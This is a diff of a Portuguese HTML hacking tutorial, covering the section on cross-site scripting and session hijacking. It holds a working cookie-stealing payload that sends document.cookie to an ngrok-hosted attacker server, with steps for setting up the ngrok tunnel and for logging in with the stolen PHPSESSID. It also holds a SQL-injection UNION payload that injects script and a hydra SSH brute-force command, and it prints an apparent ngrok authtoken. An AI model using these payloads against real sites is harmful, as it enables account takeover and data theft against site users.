@@ -250,7 +250,7 @@ proxychains hydra -l nomedousuario -P wordlist.txt http://nomeouipdoalvo.com ssh
 
 <p>Quando o conteúdo do parâmetro da URL não filtra os dados, ele permite execução de códigos Javascript diretamente na página, os ataques em XSS se baseiam nisso daí.</p>
 
-<p>Como sabemos, é só passar num parâmetro algum código em linguagens clientes, como HTML ou Javascript, como por exemplo <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>, se o código executar, o site está vulnerável. Se conseguirmos, por exemplo, guardar esse código num banco de dados do site, podemos inclusive fazer um XSS persistente, que sempre será executado ao ser acesso.</p>
+<p>Como sabemos, é só passar num parâmetro algum código em linguagens clientes, como HTML ou Javascript, como por exemplo <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>, se o código executar, o site está vulnerável. Se conseguirmos, por exemplo, guardar esse código num banco de dados do site, podemos inclusive fazer um XSS persistente, que sempre será executado ao ser acessado.</p>
 
 <p>Podemos por exemplo, pegar o cookie de sessão para logarmos numa conta de um determinado site sem precisar da senha.</p>
 
@@ -268,19 +268,23 @@ proxychains hydra -l nomedousuario -P wordlist.txt http://nomeouipdoalvo.com ssh
 
 <p>Só que esse programa só rodará na nossa rede local, para colocarmos num site externo, precisaremos de uma ferramenta chamada Ngrok. Instale ela no Linux. E vá nesse site e crie uma conta: <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank">https://dashboard.ngrok.com/get-started/your-authtoken</a></p>
 
-<p>Execute o token de autenticação desse link acima colando no terminal <code>ngrok config add-authtoken 2WuSL5sulv2PLVx84eSXZ2DFnTQ_6p9RX5ute9tR1JZw9S1N8</code>. Depois digite o comando <code>ngrok http 8000</code>. Basta copiar o link em <q>forwarding</q> (como por exemplo <code>https://6cd2-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/ataque.js</code>) e ele estará com nosso diretório disponível, com o arquivo js criado por nós.</p>
+<p>Execute o token de autenticação desse link acima colando no terminal <code>ngrok config add-authtoken 2WuSL5sulv2PLVx84eSXZ2DFnTQ_6p9RX5ute9tR1JZw9S1N8</code>. Depois digite o comando <code>ngrok http 8000</code>. Basta copiar o link dentro do site em Endpoints (como por exemplo <code>https://6cd2-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/ataque.js</code>) e ele estará com nosso diretório disponível, com o arquivo js criado por nós. Não esqueça de manter o servidor Python ativo.</p>
 
 <p>No caso, no Javascript, deixaremos apenas esse código:</p>
 
 <pre>
 <code>
 new Image().src = "https://3b42-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/?" + document.cookie; // Não esqueça da interrogação
+
+location = "/"; // Redirecionamento ao index
 </code>
 </pre>
 
 <p>Dessa forma, obteremos o cookie através do link em qualquer local no mundo.</p>
 
 <p>Para logar, basta ir nas ferramentas do navegador, e no Armazenamento, basta colocar o valor <q>roubado</q> no cookie PHPSESSIONID e recarregar a página que será logado.</p>
+
+<p>PS: Caso seja necessário, use a mesma lógica do SQL Injection para inserir o código Javascript no site, colocando algo na url como <code>-1 union select 1, 2, '&lt;script&gt;alert(document.cookie)&lt;/script&gt;';--</code>.</p>
 
 <h3>Utilizando os programas do Dsniff</h3>
 
